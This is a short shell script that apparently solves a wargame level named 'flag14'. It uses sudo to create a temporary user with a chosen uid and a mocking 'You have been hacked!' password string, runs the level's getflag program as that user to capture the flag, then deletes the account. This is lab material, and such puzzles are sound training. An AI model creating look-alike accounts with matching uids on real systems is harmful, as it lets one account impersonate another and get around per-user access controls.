#!/bin/sh

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3014 \
  flag14
echo -n 'flag14: '
sudo -u flag14 getflag | grep -oE '[^ ]+$'
sudo userdel flag14
